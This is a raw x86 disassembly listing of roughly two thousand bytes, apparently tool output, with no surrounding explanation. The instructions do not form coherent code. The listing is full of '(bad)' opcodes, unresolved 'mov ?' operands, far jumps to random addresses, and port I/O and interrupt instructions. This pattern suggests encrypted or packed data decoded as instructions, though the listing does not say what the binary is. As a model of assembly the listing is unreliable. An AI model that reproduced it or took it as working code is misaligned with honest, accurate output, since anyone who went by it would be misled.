  40925f:	inc    ebp
  409260:	out    0x44,al
  409262:	cmp    DWORD PTR [edi],esi
  409264:	cmp    bl,BYTE PTR [ebx+ebx*4-0x7a2433df]
  40926b:	scas   al,BYTE PTR es:[edi]
  40926c:	xchg   ebx,eax
  40926d:	pop    esi
  40926e:	push   edx
  40926f:	gs add al,0xf6
  409272:	ret    0xad84
  409275:	mov    esi,0x9a1ca8d9
  40927a:	inc    edi
  40927b:	cmp    ebp,DWORD PTR [ecx+0x3b]
  40927e:	ins    DWORD PTR es:[edi],dx
  40927f:	mov    ch,0xab
  409281:	pop    edi
  409282:	fiadd  WORD PTR [ebx-0x46378562]
  409288:	lea    edx,[edi]
  40928a:	xor    eax,0x5e8305d5
  40928f:	vcvtps2dq ymm0,YMMWORD PTR [esi]
  409293:	mov    edi,0x41529016
  409298:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40929a:	ja     0x4092bd
  40929c:	retf   
  40929d:	cmc    
  40929e:	inc    esp
  40929f:	mul    BYTE PTR [esi]
  4092a1:	jns    0x40925e
  4092a3:	je     0x409290
  4092a5:	test   al,0x61
  4092a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092a8:	sub    BYTE PTR [esi-0x52],ch
  4092ab:	jl     0x4092f0
  4092ad:	rep outs dx,BYTE PTR ds:[esi]
  4092b0:	out    0xc,eax
  4092b2:	inc    ebp
  4092b3:	dec    esp
  4092b4:	pop    edx
  4092b5:	retf   
  4092b6:	pusha  
  4092b7:	pop    eax
  4092b8:	aas    
  4092b9:	sub    ch,ch
  4092bb:	div    BYTE PTR [ecx+eax*8+0x71]
  4092bf:	adc    BYTE PTR ds:0x66bb8785,ch
  4092c5:	add    eax,0x74ea7821
  4092ca:	adc    DWORD PTR [edx-0x73f8b42],edi
  4092d0:	push   esp
  4092d1:	retf   
  4092d2:	bound  ebx,QWORD PTR [ebx-0x14183c64]
  4092d8:	pop    ebx
  4092d9:	cli    
  4092da:	rol    esi,cl
  4092dc:	adc    BYTE PTR [ecx+0x7f7f436],0xc2
  4092e3:	mov    ebp,0x9a9015a9
  4092e8:	pop    eax
  4092e9:	adc    DWORD PTR [ebp+0x64],edx
  4092ec:	sti    
  4092ed:	pushf  
  4092ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092ef:	push   esi
  4092f0:	dec    edx
  4092f1:	add    eax,0xfad79fd3
  4092f6:	inc    edx
  4092f7:	mov    al,0xed
  4092f9:	jns    0x40930e
  4092fb:	fs cmp bh,cl
  4092fe:	mov    ?,WORD PTR [ecx+0x53c3be80]
  409304:	imul   ebp,DWORD PTR [edx+0x2d8b0877],0x56b65ff8
  40930e:	iret   
  40930f:	int    0x9e
  409311:	pop    esi
  409312:	cmp    ebx,DWORD PTR [ebp-0x4cd0b162]
  409318:	xor    esi,edi
  40931a:	pop    ss
  40931b:	popa   
  40931c:	jge    0x409360
  40931e:	out    dx,eax
  40931f:	jle    0x4092c5
  409321:	lock pop es
  409323:	push   edx
  409324:	dec    ecx
  409325:	aam    0x3c
  409327:	sar    DWORD PTR [ecx-0x579a7222],0xcb
  40932e:	jbe    0x4092e5
  409330:	aaa    
  409331:	add    esp,DWORD PTR [eax]
  409333:	enter  0xc301,0x52
  409337:	jmp    0x409314
  409339:	jmp    0x4092bf
  40933b:	inc    esp
  40933c:	je     0x4092f6
  40933e:	out    dx,eax
  40933f:	and    ebx,eax
  409341:	inc    ecx
  409342:	mov    ah,0x5a
  409344:	jl     0x4093a9
  409346:	gs jle 0x4092d4
  409349:	and    DWORD PTR [ecx],eax
  40934b:	sar    edx,cl
  40934d:	test   eax,0xf76044a3
  409352:	pushf  
  409353:	jbe    0x409347
  409355:	mov    esi,0xe3dc6fc2
  40935a:	inc    esi
  40935b:	retf   0x59ae
  40935e:	(bad)  
  40935f:	das    
  409360:	cmp    BYTE PTR [ecx+0x48abe4f9],dh
  409366:	push   ebx
  409367:	nop
  409368:	in     eax,0x28
  40936a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40936b:	call   0xb69c22e5
  409370:	dec    ecx
  409371:	fidivr DWORD PTR [edx]
  409373:	and    edi,DWORD PTR [edx-0x4f4638b7]
  409379:	xor    DWORD PTR [eax-0x10],esp
  40937c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40937d:	inc    edx
  40937e:	mov    ds:0xc9a10cf1,eax
  409383:	dec    edx
  409384:	test   al,0xf8
  409386:	xor    edx,DWORD PTR [esi+0x1e5f3ee6]
  40938c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40938d:	inc    ecx
  40938e:	cli    
  40938f:	stos   DWORD PTR es:[edi],eax
  409390:	jb     0x4093cb
  409392:	push   ebp
  409393:	xlat   BYTE PTR ds:[ebx]
  409394:	stos   DWORD PTR es:[edi],eax
  409395:	xor    al,0xa3
  409397:	clc    
  409398:	pusha  
  409399:	retf   
  40939a:	js     0x4093e1
  40939c:	cmp    al,0x40
  40939e:	div    DWORD PTR [edi-0x1d]
  4093a1:	fcmovnb st,st(2)
  4093a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093a4:	jae    0x40939e
  4093a6:	sub    cl,BYTE PTR [ebp-0x51dc23c2]
  4093ac:	jp     0x40940d
  4093ae:	cmp    eax,0x68db3501
  4093b3:	mov    DWORD PTR [edi+0x2ea00a33],eax
  4093b9:	sahf   
  4093ba:	dec    ebx
  4093bb:	mov    ebx,0x42c01ba0
  4093c0:	in     eax,dx
  4093c1:	inc    edx
  4093c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c3:	dec    edi
  4093c4:	jnp    0x4093d4
  4093c6:	fld    QWORD PTR [ebp+0x6a]
  4093c9:	mov    edi,0x44c7d06e
  4093ce:	adc    ah,BYTE PTR [ebx]
  4093d0:	or     DWORD PTR [edx],eax
  4093d2:	xor    al,0x23
  4093d4:	ficomp DWORD PTR [eax+eax*8+0xddf8a45]
  4093db:	mov    cl,al
  4093dd:	fs or  eax,0x6c26dfd1
  4093e3:	mov    DWORD PTR [ebx],ecx
  4093e5:	mov    eax,ds:0x43c2edf8
  4093ea:	sub    eax,0x5f6a1632
  4093ef:	cmp    al,0x71
  4093f1:	data16 sub BYTE PTR es:[esi-0x3a],bl
  4093f6:	or     al,0x8c
  4093f8:	xchg   ebx,eax
  4093f9:	mov    edx,0x9706df27
  4093fe:	or     BYTE PTR [esi],ch
  409400:	js     0x4093ea
  409402:	loope  0x4093b2
  409404:	pop    edi
  409405:	cli    
  409406:	push   edi
  409407:	adc    bh,bl
  409409:	sti    
  40940a:	adc    eax,0x99d32077
  40940f:	cld    
  409410:	sbb    cl,dl
  409412:	loop   0x4093f0
  409414:	shl    DWORD PTR [esi-0x59],0x33
  409418:	arpl   WORD PTR [ecx-0x66],sp
  40941b:	mov    dl,0x5
  40941d:	(bad)  
  40941e:	pop    eax
  40941f:	call   0xbcc7:0x75a5717
  409426:	push   edi
  409427:	scas   eax,DWORD PTR es:[edi]
  409428:	inc    edi
  409429:	xchg   esp,eax
  40942a:	and    dh,BYTE PTR [edx-0x791546a8]
  409430:	icebp  
  409431:	mov    cl,0xa7
  409433:	inc    ebp
  409434:	add    BYTE PTR [edi],0x1b
  409437:	push   0x2d
  409439:	jns    0x4093c1
  40943b:	mov    bl,0x59
  40943d:	out    0xc,eax
  40943f:	fisttp QWORD PTR [esi]
  409441:	int3   
  409442:	add    al,0x53
  409444:	pop    esp
  409445:	adc    DWORD PTR [ebx*1+0x56c3a7ef],eax
  40944c:	jae    0x409425
  40944e:	popa   
  40944f:	xlat   BYTE PTR ds:[ebx]
  409450:	cmp    cl,cl
  409452:	jae    0x4094bc
  409454:	fwait
  409455:	out    dx,al
  409456:	in     eax,dx
  409457:	(bad)  
  409459:	sqrtps xmm3,XMMWORD PTR ss:[ecx-0x23]
  40945e:	mov    cl,0xfb
  409460:	es xchg dh,al
  409463:	repz jno 0x409482
  409466:	mov    esp,0x197cf41d
  40946b:	loope  0x40945f
  40946d:	rcr    BYTE PTR [eax+0x6d],0x5a
  409471:	sub    ch,BYTE PTR [edi]
  409473:	add    BYTE PTR es:[ebx-0x2ec19314],0x6f
  40947b:	int3   
  40947c:	repnz aas 
  40947e:	pop    ecx
  40947f:	inc    esi
  409480:	ja     0x40947c
  409482:	mov    ecx,0x8c786aef
  409487:	xchg   esp,eax
  409488:	cmp    esi,DWORD PTR [ebp+edi*1+0x5d957d3e]
  40948f:	adc    DWORD PTR [esi+0x5bf7493f],eax
  409495:	jle    0x409471
  409497:	stos   DWORD PTR es:[edi],eax
  409498:	ficomp DWORD PTR [edi]
  40949a:	fldenv [eax-0x59]
  40949d:	inc    edi
  40949e:	dec    edx
  40949f:	or     eax,0xff914257
  4094a4:	push   ss
  4094a5:	adc    dl,BYTE PTR [esi]
  4094a7:	out    0x4c,eax
  4094a9:	stos   BYTE PTR es:[edi],al
  4094aa:	and    ecx,edx
  4094ac:	xchg   edx,eax
  4094ad:	dec    esp
  4094ae:	fisttp QWORD PTR es:[ecx+0x3d]
  4094b2:	inc    edi
  4094b3:	xchg   edx,eax
  4094b4:	test   al,0x76
  4094b6:	xchg   DWORD PTR [ebx-0x29],ebx
  4094b9:	and    edi,DWORD PTR [edi+0x49]
  4094bc:	pop    esp
  4094bd:	test   DWORD PTR [eax-0x3976ab35],ecx
  4094c3:	xchg   DWORD PTR [esi+0x0],edx
  4094c6:	icebp  
  4094c7:	js     0x4094ee
  4094c9:	mov    al,ds:0x6494058c
  4094ce:	jecxz  0x4094c7
  4094d0:	stos   DWORD PTR es:[edi],eax
  4094d1:	cs inc eax
  4094d3:	pop    ss
  4094d4:	inc    ecx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	inc    edi
  4094d7:	ins    BYTE PTR es:[edi],dx
  4094d8:	add    cl,BYTE PTR [ecx-0x2e]
  4094db:	outs   dx,BYTE PTR ds:[esi]
  4094dc:	add    edi,edi
  4094de:	jbe    0x409496
  4094e0:	push   esp
  4094e1:	ror    DWORD PTR [ebp-0x64718da6],cl
  4094e7:	cmp    al,0xf0
  4094e9:	xor    eax,0xd473835b
  4094ee:	pop    esi
  4094ef:	add    al,0x77
  4094f1:	fsubr  QWORD PTR [ebp+esi*4+0x2a]
  4094f5:	pop    ds
  4094f6:	(bad)  
  4094f7:	fdivrp st(0),st
  4094f9:	(bad)  
  4094fa:	fst    DWORD PTR [edi-0x33ae981e]
  409500:	std    
  409501:	mov    esp,0xd4bd250c
  409506:	push   esi
  409507:	lods   al,BYTE PTR ds:[esi]
  409508:	pushf  
  409509:	fs inc edx
  40950b:	mov    gs:0xba773b26,al
  409511:	jmp    0xda5:0xbe09e43d
  409518:	and    eax,0x15ab2c3f
  40951d:	or     BYTE PTR [edx+0x44],dl
  409520:	mov    al,0x68
  409522:	sbb    BYTE PTR ds:0xd42b6a8d,bl
  409528:	sbb    bh,BYTE PTR [eax]
  40952a:	pop    ecx
  40952b:	mov    ecx,0x2b2d5077
  409530:	out    0xac,eax
  409532:	add    DWORD PTR [edx+0x3871ab6d],esi
  409538:	pop    ecx
  409539:	push   cs
  40953a:	jmp    0x292d2b9d
  40953f:	jge    0x409575
  409541:	js     0x4094f8
  409543:	call   FWORD PTR [bp+si-0x14ba]
  409548:	mov    eax,es
  40954a:	mov    esi,0x56738525
  40954f:	push   es
  409550:	mov    cl,0xec
  409552:	xor    al,0x15
  409554:	sbb    BYTE PTR [edi+0x680ff645],ah
  40955a:	cmp    dh,BYTE PTR [ecx+ebp*2-0x36abbb58]
  409561:	push   0x9e2ebee7
  409566:	test   al,0x60
  409568:	fsub   QWORD PTR ds:0x531a8e5f
  40956e:	inc    esp
  40956f:	push   ebx
  409570:	sbb    eax,0x8285dd9a
  409575:	jns    0x4095e9
  409577:	ins    BYTE PTR es:[edi],dx
  409578:	and    al,0x7a
  40957a:	pop    ds
  40957b:	jmp    0x550e:0xf96e25e0
  409582:	daa    
  409583:	cmp    dh,BYTE PTR [ecx]
  409585:	loopne 0x40958c
  409587:	ret    
  409588:	mov    ds:0x508ab607,eax
  40958d:	test   al,0x53
  40958f:	iret   
  409590:	aaa    
  409591:	inc    ebx
  409592:	cmp    ebp,eax
  409594:	or     DWORD PTR [ebx+0x5561b489],ebx
  40959a:	sar    edx,0xf2
  40959d:	inc    edx
  40959e:	mov    DWORD PTR [ebx],edi
  4095a0:	sbb    al,0x67
  4095a2:	(bad)  
  4095a3:	lahf   
  4095a4:	jp     0x409598
  4095a6:	(bad)  
  4095a7:	loop   0x40960e
  4095a9:	push   ecx
  4095aa:	jne    0x409551
  4095ac:	sbb    eax,0x61cadea4
  4095b1:	mov    edi,0x3e594879
  4095b6:	add    al,0xe1
  4095b8:	adc    eax,0xe6267084
  4095bd:	add    ebp,esi
  4095bf:	dec    edi
  4095c0:	sub    eax,0xdbddfae7
  4095c5:	xchg   esi,eax
  4095c6:	jbe    0x40960c
  4095c8:	scas   eax,DWORD PTR es:[edi]
  4095c9:	lock lock test BYTE PTR [ebp+0x643c8ccb],bh
  4095d1:	popf   
  4095d2:	pop    ebp
  4095d3:	mov    cl,0x64
  4095d5:	mov    eax,DWORD PTR [ecx+0x6b5a09eb]
  4095db:	ins    DWORD PTR es:[edi],dx
  4095dc:	retf   
  4095dd:	loopne 0x4095fc
  4095df:	out    0x32,eax
  4095e1:	nop
  4095e2:	sub    BYTE PTR [edi+0x60],dl
  4095e5:	test   al,0x5a
  4095e7:	shr    cl,1
  4095e9:	cwde   
  4095ea:	jge    0x4095bd
  4095ec:	xchg   esp,eax
  4095ed:	icebp  
  4095ee:	call   0x78a99639
  4095f3:	mov    ecx,0x53858828
  4095f8:	cmp    bh,BYTE PTR [ebx]
  4095fa:	ds cmc 
  4095fc:	enter  0x1c3e,0x2d
  409600:	fld    TBYTE PTR [ebp-0x498c225d]
  409606:	pop    edx
  409607:	cld    
  409608:	js     0x40963a
  40960a:	mov    dl,0xc
  40960c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960d:	adc    DWORD PTR [esi],esi
  40960f:	mov    ebp,0x3838f62d
  409614:	pop    edi
  409615:	push   esi
  409616:	scas   al,BYTE PTR es:[edi]
  409617:	push   es
  409618:	jmp    FWORD PTR [edi+0x78]
  40961b:	loop   0x40967a
  40961d:	pushf  
  40961e:	stc    
  40961f:	fisttp DWORD PTR [esi]
  409621:	imul   esp,DWORD PTR [ebx+0x526552f2],0x45a7f482
  40962b:	jge    0x4095d7
  40962d:	adc    eax,0x3ddb0766
  409632:	das    
  409633:	jae    0x40961b
  409635:	out    dx,eax
  409636:	jae    0x409685
  409638:	test   al,0x34
  40963a:	mov    ds:0x1cf0a422,eax
  40963f:	dec    eax
  409640:	add    eax,0x325ed140
  409645:	daa    
  409646:	ffree  st(4)
  409648:	inc    ecx
  409649:	xchg   edx,eax
  40964a:	loope  0x4095ee
  40964c:	pushf  
  40964d:	stos   BYTE PTR es:[edi],al
  40964e:	arpl   dx,sp
  409650:	xor    DWORD PTR [ebp-0x5f],0xb95ad933
  409657:	aas    
  409658:	sub    ecx,eax
  40965a:	gs stc 
  40965c:	ficomp WORD PTR [eax]
  40965e:	push   ecx
  40965f:	push   esi
  409660:	sub    dh,BYTE PTR [edx+0x49]
  409663:	aas    
  409664:	pop    esp
  409665:	in     al,0x97
  409667:	cmp    BYTE PTR [eax-0xc2f472b],ch
  40966d:	mul    BYTE PTR [ebp+0x5fc2fe5f]
  409673:	aas    
  409674:	xchg   BYTE PTR [ebp-0x478fbf67],ah
  40967a:	mov    ecx,0xa475bb5a
  40967f:	outs   dx,BYTE PTR ds:[esi]
  409680:	retf   
  409681:	shl    DWORD PTR [eax],1
  409683:	mov    dh,0xe8
  409685:	sub    al,0x67
  409687:	mov    ch,0xf
  409689:	xor    DWORD PTR [esi],0xb051268a
  40968f:	shl    DWORD PTR [edx],cl
  409691:	mov    edx,0x17136925
  409696:	mov    edx,0xa455103
  40969b:	stc    
  40969c:	inc    ebp
  40969d:	jmp    0x4096dc
  40969f:	lea    ecx,[esi+ebp*8+0x5b9ae567]
  4096a6:	xchg   edi,eax
  4096a7:	popa   
  4096a8:	and    bh,BYTE PTR [esi+0x3d]
  4096ab:	(bad)  
  4096ac:	cmp    ecx,0x11
  4096af:	lock stos BYTE PTR es:[edi],al
  4096b1:	jecxz  0x409676
  4096b3:	jnp    0x4096a3
  4096b5:	call   0xd6a7aaca
  4096ba:	jmp    0xa2b5:0x6928cd52
  4096c1:	mov    ds:0xe4900052,al
  4096c6:	out    0x99,eax
  4096c8:	jp     0x4096d1
  4096ca:	in     al,dx
  4096cb:	pop    esi
  4096cc:	mov    edi,0x7a96863c
  4096d1:	ds (bad) 
  4096d3:	jmp    0x8486143b
  4096d8:	xchg   esp,eax
  4096d9:	test   al,0xfb
  4096db:	mov    bh,0xb3
  4096dd:	push   esi
  4096de:	test   BYTE PTR [ecx],ah
  4096e0:	dec    esp
  4096e1:	loope  0x409762
  4096e3:	mov    DWORD PTR [edx],edi
  4096e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096e6:	adc    BYTE PTR [edx-0x37],al
  4096e9:	mov    bl,0xe1
  4096eb:	(bad)  
  4096ed:	mov    cl,0x2
  4096ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096f0:	or     esp,DWORD PTR [ecx]
  4096f2:	dec    ecx
  4096f3:	enter  0x4a38,0x87
  4096f7:	mov    dh,0x28
  4096f9:	lods   al,BYTE PTR ds:[esi]
  4096fa:	aad    0x8d
  4096fc:	pop    edx
  4096fd:	ds inc ebx
  4096ff:	sbb    eax,0xaa28a42
  409704:	dec    eax
  409705:	(bad)  
  409706:	push   cs
  409707:	dec    edi
  409708:	ret    
  409709:	xor    BYTE PTR [ebp+0x23],ch
  40970c:	pusha  
  40970d:	in     al,0x43
  40970f:	cwde   
  409710:	sbb    ch,BYTE PTR [ebp-0x60]
  409713:	push   ss
  409714:	icebp  
  409715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409716:	push   0x88982d2f
  40971b:	cmp    al,BYTE PTR [eax+0x760fbf30]
  409721:	pusha  
  409722:	sbb    DWORD PTR [ebx+0x62fd01a7],esp
  409728:	dec    esi
  409729:	out    0x49,al
  40972b:	inc    DWORD PTR [esp+ebx*1-0x3e]
  40972f:	(bad)  
  409730:	mov    ebp,0x5a6a7e75
  409735:	sbb    al,0x10
  409737:	inc    ecx
  409738:	push   ebx
  409739:	retf   
  40973a:	mov    edx,0x538a1dc
  40973f:	fs pop ecx
  409741:	aaa    
  409742:	adc    eax,0x8e586e63
  409747:	(bad)  
  409748:	and    BYTE PTR [ebx],bh
  40974a:	(bad)
  40974f:	or     BYTE PTR [ebx+0x6fa80b3f],dl
  409755:	jp     0x40977a
  409757:	dec    edx
  409758:	push   0x1d
  40975a:	in     eax,0x83
  40975c:	pushf  
  40975d:	dec    eax
  40975e:	ins    BYTE PTR es:[edi],dx
  40975f:	mov    ebx,0x6258a620
  409764:	les    ebx,FWORD PTR [ebx]
  409766:	add    BYTE PTR [esi-0x7f],0x1a
  40976a:	jno    0x409717
  40976c:	hlt    
  40976d:	push   eax
  40976e:	cmp    al,0x53
  409770:	scas   eax,DWORD PTR es:[edi]
  409771:	push   0xb166b87b
  409776:	sub    al,0x5f
  409778:	xor    bh,dl
  40977a:	nop
  40977b:	jns    0x409769
  40977d:	ins    BYTE PTR es:[edi],dx
  40977e:	pop    ebp
  40977f:	mov    edx,0xe0d8c1ac
  409784:	sub    BYTE PTR [ebx+0x62],ch
  409787:	sub    dl,BYTE PTR [esi+0x31]
  40978a:	popa   
  40978b:	mov    eax,DWORD PTR [ecx]
  40978d:	add    ah,dh
  40978f:	int3   
  409790:	mov    ds:0x1e0b5135,al
  409795:	iret   
  409796:	ror    BYTE PTR [edi],0x71
  409799:	outs   dx,DWORD PTR ds:[esi]
  40979a:	mov    al,0x66
  40979c:	je     0x40974e
  40979e:	xchg   ebx,eax
  40979f:	push   es
  4097a0:	xchg   edi,eax
  4097a1:	nop
  4097a2:	xor    ebx,DWORD PTR [ecx+ebp*8-0x61dec1ca]
  4097a9:	xor    eax,0xad91ef76
  4097ae:	push   esp
  4097af:	pop    eax
  4097b0:	mov    ecx,DWORD PTR [ecx]
  4097b2:	mov    eax,DWORD PTR [eax-0x74]
  4097b5:	stos   DWORD PTR es:[edi],eax
  4097b6:	mov    ecx,0xeb96cf05
  4097bb:	dec    ecx
  4097bc:	sti    
  4097bd:	dec    ebp
  4097be:	and    BYTE PTR [ebp-0x6bacd581],bl
  4097c4:	stos   DWORD PTR es:[edi],eax
  4097c5:	dec    ebx
  4097c6:	cmc    
  4097c7:	int3   
  4097c8:	jmp    0x409821
  4097ca:	lahf   
  4097cb:	test   al,0x92
  4097cd:	mov    bl,0xb6
  4097cf:	xchg   esi,eax
  4097d0:	lods   eax,DWORD PTR ds:[esi]
  4097d1:	xor    eax,0x9985ef53
  4097d6:	leave  
  4097d7:	rol    DWORD PTR [edx-0x4a],0x3d
  4097db:	call   0x6e4a3bf7
  4097e0:	inc    ecx
  4097e1:	test   eax,0x6b50519d
  4097e6:	das    
  4097e7:	fadd   QWORD PTR [ebx+0x898e7ac]
  4097ed:	or     edx,ebp
  4097ef:	aaa    
  4097f0:	dec    ebp
  4097f1:	les    esi,FWORD PTR [ebp-0x72]
  4097f4:	out    0xf,al
  4097f6:	lea    edi,ds:[edi+0x2a]
  4097fa:	xor    esp,DWORD PTR [eax+0x22562ee]
  409800:	push   esi
  409801:	mov    bh,0xd5
  409803:	sbb    cl,BYTE PTR [eax]
  409805:	pop    edx
  409806:	fdivr  st,st(4)
  409808:	jmp    0x4097d3
  40980a:	mov    ah,0xea
  40980c:	repnz or BYTE PTR [edi],ah
  40980f:	dec    DWORD PTR ds:[ebx]
  409812:	imul   eax,DWORD PTR [ebx],0x7429668f
  409818:	dec    edi
  409819:	fisttp DWORD PTR [ebx+0x6934e5fc]
  40981f:	cmc    
  409820:	dec    esp
  409821:	scas   al,BYTE PTR es:[edi]
  409822:	xchg   esi,eax
  409823:	pop    es
  409824:	in     al,0xc5
  409826:	imul   eax,esp,0x1c
  409829:	cdq    
  40982a:	xchg   BYTE PTR [ebx],al
  40982c:	stos   BYTE PTR es:[edi],al
  40982d:	dec    ebx
  40982e:	and    DWORD PTR [eax+0x2e86770b],esp
  409834:	cld    
  409835:	add    eax,0xccf95652
  40983a:	clc    
  40983b:	fucompp 
  40983d:	repz jg 0x4098ab
  409840:	dec    ebp
  409841:	stc    
  409842:	ret    0x37f8
  409845:	(bad)  
  409846:	ins    BYTE PTR es:[edi],dx
  409847:	popa   
  409848:	jl     0x409852
  40984a:	shr    bh,cl
  40984c:	cmp    DWORD PTR [ecx+0x18],ebx
  40984f:	cmp    bl,BYTE PTR [edx]
  409851:	jnp    0x4097f9
  409853:	pusha  
  409854:	pop    ebx
  409855:	mov    esi,0x504ec741
  40985a:	sbb    al,0xeb
  40985c:	jecxz  0x4098bd
  40985e:	call   0x2f84:0xc651de14
  409865:	ins    DWORD PTR es:[edi],dx
  409866:	fidiv  DWORD PTR [ebx-0x140c48f]
  40986c:	retf   
  40986d:	pusha  
  40986e:	jae    0x4098a2
  409870:	je     0x4097f3
  409872:	dec    eax
  409873:	or     esi,0xbc17fb1
  409879:	sar    DWORD PTR [esi-0x7d],1
  40987c:	pop    ss
  40987d:	(bad)  
  40987e:	mov    esp,0x4654de72
  409883:	xchg   edi,eax
  409884:	call   0x7d29e70c
  409889:	scas   al,BYTE PTR es:[edi]
  40988a:	inc    ebp
  40988b:	cdq    
  40988c:	test   cl,bl
  40988e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40988f:	out    0xd4,al
  409891:	cmp    ecx,DWORD PTR [esi]
  409893:	aad    0x1e
  409895:	(bad)  
  409896:	mov    al,ds:0xa5478358
  40989b:	sahf   
  40989c:	pop    ss
  40989d:	fwait
  40989e:	iret   
  40989f:	dec    esp
  4098a0:	loop   0x40983f
  4098a2:	jg     0x40987c
  4098a4:	into   
  4098a5:	push   0xffffffa0
  4098a7:	mov    al,BYTE PTR [edx]
  4098a9:	push   eax
  4098aa:	mov    dl,0x1
  4098ac:	inc    esp
  4098ad:	fild   DWORD PTR [edx+0x7874e3da]
  4098b3:	inc    esp
  4098b4:	pop    ecx
  4098b5:	add    eax,0x811c4e2a
  4098ba:	mov    ch,0xdc
  4098bc:	or     ah,BYTE PTR [ecx-0x1d9daaad]
  4098c2:	jne    0x40992c
  4098c4:	xor    ebx,edi
  4098c6:	mov    eax,0x85dece82
  4098cb:	arpl   WORD PTR [eax],bx
  4098cd:	jmp    DWORD PTR [ebx]
  4098cf:	inc    edi
  4098d0:	pop    edi
  4098d1:	or     esi,ecx
  4098d3:	fdiv   st,st(3)
  4098d5:	imul   edi,esp,0x19
  4098d8:	aad    0x6d
  4098da:	jmp    0x40990c
  4098dc:	call   DWORD PTR [eax]
  4098de:	cli    
  4098df:	cmp    al,0xb
  4098e1:	(bad)  
  4098e2:	add    BYTE PTR ds:[ebp+0x25],dl
  4098e6:	inc    eax
  4098e7:	aam    0xa
  4098e9:	loop   0x40989b
  4098eb:	cmp    DWORD PTR [esi-0x5592f204],ebx
  4098f1:	xchg   ebx,eax
  4098f2:	mov    edi,0x44f9e243
  4098f7:	ja     0x4098ed
  4098f9:	pop    ecx
  4098fa:	jmp    0x1e21:0x82bafed9
  409901:	cmp    esi,0x4e
  409904:	xchg   ebp,eax
  409905:	std    
  409906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409907:	xor    eax,0x28f3bcf2
  40990c:	test   DWORD PTR [ebx-0x10f38c25],esi
  409912:	or     esp,ebp
  409914:	mov    eax,ds:0xb188f0ab
  409919:	bound  ebp,QWORD PTR [edx]
  40991b:	inc    esp
  40991c:	lods   eax,DWORD PTR ds:[esi]
  40991d:	xchg   ecx,eax
  40991e:	or     esi,ecx
  409920:	jb     0x4098a6
  409922:	in     eax,0xb0
  409924:	inc    esi
  409925:	and    BYTE PTR ds:0x937eb030,ch
  40992b:	pop    ebx
  40992c:	scas   eax,DWORD PTR es:[edi]
  40992d:	cmp    BYTE PTR [edx],dl
  40992f:	pop    ds
  409930:	push   es
  409931:	hlt    
  409932:	push   ds
  409933:	mov    ss,WORD PTR [edi+0x3a2aaa51]
  409939:	dec    esp
  40993a:	enter  0x47e4,0xa0
  40993e:	xchg   ecx,eax
  40993f:	mov    esi,DWORD PTR [edx]
  409941:	push   0x87da6613
  409946:	add    al,0x5c
  409948:	mul    BYTE PTR [ebx+0x69]
  40994b:	sub    DWORD PTR [ecx+ecx*4-0x1a],ecx
  40994f:	jo     0x409906
  409951:	arpl   WORD PTR [edi+0x1cb1443],di
  409957:	cmp    BYTE PTR [esi],dh
  409959:	fwait
  40995a:	push   es
  40995b:	push   0xffffff89
  40995d:	jae    0x40997f
  40995f:	mov    ebp,0xcfdd623f
  409964:	xchg   DWORD PTR [esi],ebp
  409966:	iret   
  409967:	or     DWORD PTR [eax],esp
  409969:	sbb    al,0x2e
  40996b:	push   0xb70a7c75
  409970:	inc    ebp
  409971:	out    0x96,al
  409973:	push   ebp
  409974:	cmc    
  409975:	mov    cl,0x85
  409977:	call   0xa180:0x18990bc3
  40997e:	xchg   esp,eax
  40997f:	mov    ebx,0x467235c2
  409984:	cmp    BYTE PTR [ecx-0x480202f7],bl
  40998a:	jge    0x409943
  40998c:	lods   al,BYTE PTR ds:[esi]
  40998d:	adc    BYTE PTR [eax],bh
  40998f:	fsub   st,st(4)
  409991:	retf   0xe8c6
  409994:	or     eax,0xcfe90eac
  409999:	cmp    eax,0xe752db2a
  40999e:	fmul   QWORD PTR [ecx+0x2e1634e3]
  4099a4:	lods   al,BYTE PTR ds:[esi]
  4099a5:	adc    ecx,esi
  4099a7:	mov    dh,0x3d
  4099a9:	sbb    cl,dh
  4099ab:	imul   eax,DWORD PTR [ebx+0xa39bbf6],0xffffff89
  4099b2:	jo     0x409a24
  4099b4:	mov    al,0x30
  4099b6:	fcomip st,st(2)
  4099b8:	retf   
  4099b9:	scas   eax,DWORD PTR es:[edi]
  4099ba:	das    
  4099bb:	cld    
  4099bc:	sbb    DWORD PTR [esi+eiz*8-0x7a096f2],0x31
  4099c4:	into   
  4099c5:	fdiv   st(1),st
  4099c7:	sbb    edi,DWORD PTR [edx+esi*4+0x4921e908]
  4099ce:	or     bh,bh
  4099d0:	inc    ebp
  4099d1:	jno    0x40997b
  4099d3:	retf   0x15a6
  4099d6:	add    DWORD PTR [edx],edx
  4099d8:	xor    al,BYTE PTR [ebp+0x19daee60]
  4099de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099df:	add    al,0x8a
  4099e1:	adc    DWORD PTR [edx+0x6a1b8593],eax
  4099e7:	je     0x4099d6
  4099e9:	popf   
  4099ea:	jns    0x40999f
  4099ec:	int    0xe2
  4099ee:	(bad)  
  4099ef:	in     eax,0x68
  4099f1:	or     BYTE PTR [ecx],bh
  4099f3:	mov    ?,WORD PTR [esi+0x71]
  4099f6:	jl     0x4099ba
  4099f8:	ror    DWORD PTR [ebx],0x29
  4099fb:	ss ds jb 0x409985
  4099ff:	mov    edx,0x34a7096d
  409a04:	lea    edi,[edi-0x1d]
  409a07:	femms  
  409a09:	mov    ebp,0xe6a1dce1
  409a0e:	sub    BYTE PTR [ebx],dl
  409a10:	xchg   ebx,eax
  409a11:	repnz pushw 0xb
  409a15:	aad    0x68
  409a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a18:	jmp    0xafb59129
  409a1d:	or     DWORD PTR [eax-0x22],0x15
